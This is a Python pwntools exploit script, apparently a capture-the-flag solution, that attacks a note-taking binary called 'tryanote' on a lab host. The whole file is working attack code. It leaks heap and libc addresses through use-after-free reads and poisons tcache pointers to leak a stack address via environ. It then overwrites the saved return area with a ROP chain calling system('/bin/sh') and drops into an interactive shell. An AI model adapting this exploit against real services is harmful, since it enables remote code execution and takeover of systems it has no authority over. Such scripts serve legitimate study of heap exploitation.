from pwn import *

context.binary = binary = ELF('./tryanote_patched',checksec=False)
libc = ELF('libc.so.6',checksec=False)

def create(size, data):
	p.sendlineafter(b'>>', b'1')
	p.sendlineafter(b'Enter entry size:\n', str(size).encode())
	p.sendlineafter(b'Enter entry data:\n', data)

def read(idx):
	p.sendlineafter(b'>>', b'2')
	p.sendlineafter(b'Enter entry index:\n', str(idx).encode())

	return p.recvline()[:-1]

def update(idx, data):
	p.sendlineafter(b'>>', b'3')
	p.sendlineafter(b'Enter entry index:\n', str(idx).encode())
	p.sendlineafter(b'Enter data:\n', data)

def delete(idx):
	p.sendlineafter(b'>>', b'4')
	p.sendlineafter(b'Enter entry index:\n', str(idx).encode())


#p = process()
p = remote('10.10.87.161', 5001)

create(0x20, b'AAAA')
create(0x500, b'BBBB')
create(0x20, b'CCCC')

delete(0)

heap_base = u64(read(0).ljust(8, b'\x00')) << 12
info(f'heap base: {hex(heap_base)}')

delete(1)

libc_leak = u64(read(1).ljust(8, b'\x00'))
info(f'libc leak: {hex(libc_leak)}')

libc.address = libc_leak - 0x219ce0
info(f'libc base: {hex(libc.address)}')

create(0x50, b'aaaa')
create(0x50, b'bbbb')

delete(3)
delete(4)

update(4, p64(heap_base >> 12 ^ (libc.symbols.environ-0x10)))

create(0x50, b'cccc')
create(0x50, b'd' * 0xf)

read(6)
stack_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
info(f'stack leak: {hex(stack_leak)}')

saved_rbp = stack_leak - 0x128
info(f'saved rbp: {hex(saved_rbp)}')

rop = ROP(libc)
ropchain = b'A' * 8
ropchain += p64(rop.find_gadget(['pop rdi','ret'])[0])
ropchain += p64(next(libc.search(b'/bin/sh\x00')))
ropchain += p64(rop.find_gadget(['ret'])[0])
ropchain += p64(libc.symbols.system)


create(0x100, b'pwn')
create(0x100, b'pwn')

delete(7)
delete(8)

update(8, p64(heap_base >> 12 ^ saved_rbp))

create(0x100, b'pwned')
create(0x100, ropchain)

p.sendline(b'0')
p.recvrepeat(1)

print('*** SHELL ***')
p.interactive()
